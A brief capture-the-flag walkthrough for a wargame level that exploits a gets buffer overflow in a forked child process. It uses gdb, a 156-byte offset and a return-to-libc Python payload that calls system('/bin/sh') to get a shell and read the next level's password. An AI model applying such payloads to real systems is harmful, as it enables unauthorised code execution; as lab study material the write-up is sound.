start ssh connection with ssh -p 4242 level04@127.0.0.1 use flag from level03

this level is quite similar to level01 except the fact that we work with child process here

start with gdb (see source), we can overflow at gets run in a child process at main+150

parent is watching his child not to run execve function and will stop us from running this type of shell code but we can make a return to libc just as we did at level02

to follow the child proccess we should make set follow-fork-mode child command at gdb

https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ for finding an offset - it is 156

we need to: set a system function pointer at return pointer of the stack, enter anything at the frame pointer, set the first local variable of the callee to /bin/sh

info proc map -> find 0xf7e2c000,0xf7fd0000,"/bin/sh" (libc functions) to find "bin/sh string address 0xf7f897ec - actually as far as we don't have rpath it is static

info function system to find system function address 0xf7e6aed0 - static to, we could look up it in level01

python -c 'print "U"*156+"\xd0\xae\xe6\xf7"+"4242"+"\xec\x97\xf8\xf7"' > /tmp/tmp to cunstruct a payload - little endian for addresses - same as level01 but 156 Us

cat /tmp/tmp /dev/stdin | ./level04 to input a payload, we add stdin to be able to continue work

go to the level05 folder and check flag in .pass!
